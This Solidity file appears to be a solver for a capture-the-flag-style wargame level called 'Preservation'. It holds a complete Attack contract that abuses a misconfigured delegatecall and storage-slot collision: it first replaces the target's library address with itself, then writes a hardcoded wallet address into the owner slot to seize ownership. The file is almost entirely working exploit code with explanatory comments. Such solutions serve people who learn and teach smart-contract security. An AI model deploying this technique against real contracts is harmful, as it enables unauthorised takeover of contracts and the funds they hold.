//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Preservation.sol";

//the task here is to take ownership of the Preservation contract
//The Preservation contract uses low-level delegatecalls
//I exploited that to overwrite the memory slot of the owner variable on the blockchain 

contract Attack{

Preservation public target;                                          //slot 0
//the address of this contract in uint256 form 
uint256 public arg = uint256(uint160(address(this)));                //slot 1
//my EOA account address
address public gxt = 0x25584D7A2a5A8915369897A7Cc2B60B11d72f657;     //slot 2 

constructor(address a) payable{
    target= Preservation(a);
}

function overwriteAddress() external{

    target.setFirstTime(arg);
    //here I call the setFirstTime function and pass my address in uint form
    //the fct uses a delegatecall that is misconfigured and overwrites the variable 
    //located in the first slot of memory (the library address)
    //as a result I change the address of the LibraryContract to this malicious contract
}

function setTime(uint256 _time) public{

    gxt= 0x25584D7A2a5A8915369897A7Cc2B60B11d72f657; //my EOA address
    //I created this function with the same name as the one in the lib so that 
    // when delegatecall is executed this fct gets triggered and changes the value
    //of the variable at slot 2 to my EOA address
}

function attack() public {

    target.setFirstTime(1); //the value of the passed arg is not relevant 
}

}
